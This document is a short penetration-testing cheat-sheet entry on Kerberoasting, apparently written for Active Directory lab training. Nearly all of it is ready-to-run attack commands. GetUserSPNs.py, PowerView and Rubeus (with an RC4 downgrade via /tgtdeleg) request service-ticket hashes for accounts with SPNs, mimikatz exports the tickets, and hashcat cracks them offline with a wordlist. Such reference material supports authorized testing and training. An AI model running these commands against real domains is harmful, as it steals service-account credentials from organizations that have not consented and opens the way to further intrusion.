# 01.11 Kerberoasting

> Request TGS hashes for SPN-bearing accounts with `GetUserSPNs.py` or `Rubeus kerberoast /tgtdeleg` and crack offline (`-m 13100`).

## Overview

Request TGS tickets for service accounts with SPNs set. Offline-crack RC4 (-m 13100) or AES256 (-m 19700). From Linux: GetUserSPNs.py. From Windows: setspn enum + manual request, PowerView Get-DomainSPNTicket, or Rubeus (prefer /tgtdeleg to downgrade AES to RC4).

## Steps

- List SPNs and confirm targets before requesting.
- Linux: GetUserSPNs.py -request to pull TGS hash.
- Windows (manual): setspn -Q */* then System.IdentityModel token request.
- Windows (PowerView): Get-DomainUser *-SPN | Get-DomainSPNTicket.
- Windows (Rubeus): /tgtdeleg forces RC4 downgrade; /nowrap for hashcat-ready output.
- Crack RC4 with hashcat -m 13100, AES256 with -m 19700.
- For kirbi export: mimikatz kerberos::list /export, then kirbi2john pipeline.

## Commands

### GetUserSPNs.py list

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 <DOMAIN>.LOCAL/forend
```

### GetUserSPNs.py request

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 <DOMAIN>.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

### PowerView SPN tickets

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Rubeus tgtdeleg

```powershell
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
```

### Rubeus target user

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

### Crack RC4

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### Crack AES

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```
